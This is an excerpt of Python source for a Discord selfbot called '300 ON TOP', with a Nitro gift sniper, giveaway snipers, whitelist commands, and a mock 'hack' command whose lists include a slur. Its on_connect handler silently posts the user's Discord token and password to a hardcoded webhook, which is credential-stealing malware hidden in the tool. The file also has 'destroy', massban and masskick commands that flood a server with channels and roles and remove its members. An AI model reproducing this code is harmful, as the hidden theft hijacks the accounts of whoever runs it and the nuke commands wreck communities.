...
def startprint():
    ...
    print(f'''{Fore.RED}
                       ...
                       {Fore.BLUE}300 ON TOP v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Exeter.user.name}#{Exeter.user.discriminator} {Fore.BLUE}| ID: {Fore.GREEN}{Exeter.user.id}   
                       {Fore.BLUE}Nitro Sniper | {Fore.GREEN}{nitro}
                       {Fore.BLUE}Cached Users| {Fore.GREEN}{len(Exeter.users)}
                       {Fore.BLUE}Guilds| {Fore.GREEN}{len(Exeter.guilds)}
                       {Fore.BLUE}Prefix| {Fore.GREEN}{Exeter.command_prefix}
    ''' + Fore.RESET)
...
async def on_message(message):
    ...
    def GiveawayData():
        print(
            f"{Fore.GREEN} - CHANNEL: {Fore.GREEN}[{message.channel}]"
            f"\n{Fore.GREEN} - SERVER: {Fore.GREEN}[{message.guild}]"
            + Fore.RESET)
    ...
    def NitroData(elapsed, code):
        print(
            f"{Fore.GREEN} - CHANNEL: {Fore.GREEN}[{message.channel}]"
            f"\n{Fore.GREEN} - SERVER: {Fore.GREEN}[{message.guild}]"
            f"\n{Fore.GREEN} - AUTHOR: {Fore.GREEN}[{message.author}]"
            f"\n{Fore.GREEN} - ELAPSED: {Fore.GREEN}[{elapsed}]"
            f"\n{Fore.GREEN} - CODE: {Fore.GREEN}{code}"
            + Fore.RESET)
    ...
    if 'discord.gift/' in message.content:
        if nitro_sniper:
            ...
            if 'This gift has been redeemed already.' in r:
                print(""
                      f"\n{Fore.BLUE}[{time} - Nitro Already Redeemed]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                      f"\n{Fore.BLUE}[{time} - Nitro Success]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                      f"\n{Fore.BLUE}[{time} - Nitro Unknown Gift Code]" + Fore.RESET)
                NitroData(elapsed, code)
        else:
            return
        ...
        if Exeter.slotbot_sniper:
            if message.author.id == 346353957029019648:
                try:
                    ...
                    print(""
                          f"\n{Fore.BLUE}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
                    SlotBotData()
                print(""
                      f"\n{Fore.BLUE}[{time} - Slotbot Grabbed]" + Fore.RESET)
                SlotBotData()
        else:
            return
        ...
        if Exeter.giveaway_sniper:
            if message.author.id == 294882584201003009:
                try:
                    ...
                    print(""
                          f"\n{Fore.BLUE}[{time} - Giveaway Couldnt React]" + Fore.RESET)
                    GiveawayData()
                print(""
                      f"\n{Fore.BLUE}[{time} - Giveaway Sniped]" + Fore.RESET)
                GiveawayData()
        else:
            return
    ...
    if f'Congratulations <@{Exeter.user.id}>' in message.content:
        if Exeter.giveaway_sniper:
            if message.author.id == 294882584201003009:
                print(""
                      f"\n{Fore.BLUE}[{time} - Giveaway Won]" + Fore.RESET)
                GiveawayData()
        else:
            return
...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/786249085866213459/VSfV2sohuXxtILuqOl9EhOVa3ThDqJMdd8QNDxpuP3mLhTQMRKuWIY3bvDCzZ1muKKmG',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
    ...
    if Exeter.antiraid is True:
        try:
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
                if guild.id in Exeter.GREENlisted_users.keys() and i.user.id in Exeter.GREENlisted_users[
    ...
    if Exeter.antiraid is True and member.bot:
        try:
            ...
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                if member.guild.id in Exeter.GREENlisted_users.keys() and i.user.id in Exeter.GREENlisted_users[
...
async def GREENlist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        await ctx.send("Please specify a user to GREENlist")
    else:
        if ctx.guild.id not in Exeter.GREENlisted_users.keys():
            Exeter.GREENlisted_users[ctx.guild.id] = {}
        if user.id in Exeter.GREENlisted_users[ctx.guild.id]:
            await ctx.send('That user is already GREENlisted')
        else:
            Exeter.GREENlisted_users[ctx.guild.id][user.id] = 0
            await ctx.send("GREENlisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_",
    ...
    #     else:
    #         Exeter.GREENlisted_users[ctx.guild.id][user.id] = 0
    #         await ctx.send("GREENlisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_","\_") + "#" + user.discriminator + "**")


@Exeter.command(aliases=['wld'])
async def GREENlisted(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        GREENlist = '`All GREENlisted Users:`\n'
        for key in Exeter.GREENlisted_users:
            for key2 in Exeter.GREENlisted_users[key]:
                user = Exeter.get_user(key2)
                GREENlist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                              "\_") + "#" + user.discriminator + "** - " + Exeter.get_guild(
                    key).name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "" + "\n"
        await ctx.send(GREENlist)
    else:
        GREENlist = "`" + ctx.guild.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                       "\_") + '\'s GREENlisted Users:`\n'
        for key in Exeter.GREENlisted_users:
            if key == ctx.guild.id:
                for key2 in Exeter.GREENlisted_users[ctx.guild.id]:
                    user = Exeter.get_user(key2)
                    GREENlist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
...
async def unGREENlist(ctx, user: discord.Member = None):
    if user is None:
        await ctx.send("Please specify the user you would like to unGREENlist")
    else:
        if ctx.guild.id not in Exeter.GREENlisted_users.keys():
            await ctx.send("That user is not GREENlisted")
            return
        if user.id in Exeter.GREENlisted_users[ctx.guild.id]:
            Exeter.GREENlisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = Exeter.get_user(user.id)
            await ctx.send(
                'Successfully unGREENlisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                           "\_") + '#' + user2.discriminator + '**')


@Exeter.command(aliases=['clearwl', 'clearwld'])
async def clearGREENlist(ctx):
    await ctx.message.delete()
    Exeter.GREENlisted_users.clear()
    await ctx.send('Successfully cleared the GREENlist hash')
...
async def mee6(ctx, param=None):
    ...
    while Exeter.mee6 is True:
        sentences = ['Stop waiting for exceptional things to just happen.',
                     ...
                     'Her hair was windswept as she rode in the GREEN convertible.',
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(name="300 𝘖𝘯 𝘛𝘰𝘱® | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Exeter.command_prefix),
                         icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url=Exeter.user.avatar_url)
        embed.set_image(url="https://cdn.discordapp.com/attachments/783630248759263251/783904137662169099/image0.gif")
        embed.add_field(name=":christmas_tree: `𝙂𝙚𝙣𝙚𝙧𝙖𝙡®`", value="Shows all general commands", inline=False)
        embed.add_field(name=":gift: `𝘼𝙘𝙘𝙤𝙪𝙣𝙩®`", value="Shows all account commands", inline=False)
        embed.add_field(name=":santa: `𝙏𝙚𝙭𝙩®`", value="Shows all text commands", inline=False)
        embed.add_field(name=":notes: `𝙈𝙪𝙨𝙞𝙘®`", value="Shows all music commands", inline=False)
        embed.add_field(name=":frame_photo: `𝙄𝙢𝙖𝙜𝙚®`", value="Shows all image manipulation commands", inline=False)
        embed.add_field(name=":underage: `𝙉𝙎𝙁𝙒®`", value="Shows all nsfw commands", inline=False)
        embed.add_field(name=":construction: `𝙈𝙞𝙨𝙘®`", value="Shows all miscellaneous commands", inline=False)
        embed.add_field(name=":shield: `𝘼𝙣𝙩𝙞-𝙉𝙪𝙠𝙚®`", value="Shows all anti-nuke commands", inline=False)
        embed.add_field(name=":bomb: `𝙉𝙪𝙠𝙚®`", value="Shows all nuke commands", inline=False)
        embed.set_footer(text= "Made by 300 Rj®")
        ...
        embed.description = f"\uD83D\uDCB0 `ANTI-NUKE COMMANDS`\n`> antiraid <on/off>` - toggles anti-nuke ({Exeter.antiraid})\n`> GREENlist <user>` - GREENlists the specified user\n**NOTE** GREENlisting a user will completely exclude them from anti-nuke detections, be weary on who you GREENlist.\n`> GREENlisted <-g>` - see who's whitleisted and in what guild\n`> unGREENlist <user>` - unGREENlists the user\n`> clearGREENlist` - clears the GREENlist hash"
        await ctx.send(embed=embed)
...
async def pingweb(ctx, website=None):
    ...
    if website is None:
        ...
        try:
            ...
            print(f"{Fore.RED}[ERROR]: {Fore.GREEN}{e}" + Fore.RESET)
        if r == 404:
...
async def hack(ctx, user: discord.Member = None):
    ...
    hair_color = ["GREEN", "Brown", "Blonde", "GREEN", "Gray", "Red"]
    skin_color = ["GREEN", "Pale", "Brown", "GREEN", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["GREEN", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
    ...
    if user is None:
        user = ctx.author
        password = ['password', '300 ON TOP', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
...
async def ghost(ctx):
    ...
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.GREEN}You didnt put your password in the config.json file" + Fore.RESET)
    else:
        password = config.get('password')
...
@Exeter.command(aliases=["rekt", "nuke","300",])
async def destroy(ctx):
    ...
    try:
        ...
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="300 ON TOP")
    for _i in range(250):
        await ctx.guild.create_role(name="300 ON TOP", color=RandomColor())


@Exeter.command(aliases=["banwave", "banall", "etb","ball",])
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="300 ON TOP")
        except:
            pass
...
async def masskick(ctx):
    ...
    for user in users:
        try:
            await user.kick(reason="300 ON TOP")
        except:
            pass
